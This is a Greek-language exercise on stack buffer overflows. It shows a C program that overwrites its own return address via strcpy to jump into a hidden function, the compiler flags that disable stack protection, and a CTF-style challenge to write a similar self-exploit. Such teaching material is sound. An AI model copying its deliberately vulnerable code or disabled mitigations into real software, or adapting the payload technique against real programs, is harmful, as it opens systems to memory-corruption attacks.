
# Challenge – Self Overflow & Payload Generation

## Παράδειγμα: Ένα πρόγραμμα που κάνει overflow στον εαυτό του

Σε αυτό το παράδειγμα, θα δούμε πώς ένα C πρόγραμμα μπορεί **μόνο του**, χωρίς είσοδο από τον χρήστη, να προκαλέσει **buffer overflow** και να κατευθύνει τη ροή του προγράμματος σε μια διαφορετική συνάρτηση.

---

## Κώδικας: `self_overflow.c`

```c
#include <stdio.h>
#include <string.h>
#include <stdint.h>

// Συνάρτηση-στόχος που δεν καλείται ποτέ απευθείας
void secret() {
    printf("Μπήκες στη secret()!
");
}

// Συνάρτηση με ευπάθεια buffer overflow
void vuln() {
    char buf[32];

    // Βρίσκουμε τη διεύθυνση της secret()
    uintptr_t addr = (uintptr_t)secret;

    // Φτιάχνουμε το payload: 40 bytes μέχρι το return address
    char payload[48];
    memset(payload, 'A', 40);              // Συμπληρώνουμε buf (32) + RBP (8)
    memcpy(payload + 40, &addr, 8);        // Αντιγράφουμε τη διεύθυνση της secret()

    // Προκαλούμε το overflow
    strcpy(buf, payload);
}

int main() {
    vuln();
    printf("Δεν μπήκες στη secret().
");
    return 0;
}
```

---

## Μεταγλώττιση

```bash
gcc -g -fno-stack-protector -z execstack -no-pie self_overflow.c -o self_overflow
```

---

## Εκτέλεση

```bash
./self_overflow
```

Αναμενόμενη έξοδος:
```
Μπήκες στη secret()!
Segmentation fault (core dumped)
```

---

## Τι πρέπει να προσέξεις:

- Η χρήση του `uintptr_t` μας επιτρέπει να χειριστούμε pointer ως αριθμό
- Η `memcpy()` τοποθετεί σωστά τη διεύθυνση σε **little endian**
- Η `strcpy()` είναι επικίνδυνη — κάνει το overflow!
- Το `secret()` εκτελείται γιατί η διεύθυνσή του αντικαθιστά τη return address

---

## Challenge – Self Exploit Generator

### Αποστολή

Γράψε ένα πρόγραμμα που:
- Περιλαμβάνει μια συνάρτηση `you_win()` που εκτυπώνει ένα flag
- Περιλαμβάνει μια ευάλωτη συνάρτηση `vuln()` με buffer 24 bytes
- Δημιουργεί και χρησιμοποιεί **εσωτερικά** ένα overflow payload για να εκτελέσει τη `you_win()`
- Δεν περιμένει **καμία είσοδο από τον χρήστη**

---

### Λεπτομέρειες

- Το payload πρέπει να περιλαμβάνει:
  - 24 bytes για τον buffer
  - 8 bytes για τον saved RBP
  - 8 bytes με τη διεύθυνση της `you_win()`
- Η διεύθυνση να περαστεί με `memcpy` σε **little endian** μορφή

---

### Υποδείγματα

```c
void you_win() {
    printf("FLAG{self_overflow_success}
");
}
```

---

### Μεταγλώττιση

```bash
gcc -g -fno-stack-protector -z execstack -no-pie self_exploit.c -o self_exploit
```

---

### Αναμενόμενη έξοδος

```
FLAG{self_overflow_success}
Segmentation fault (core dumped)
```

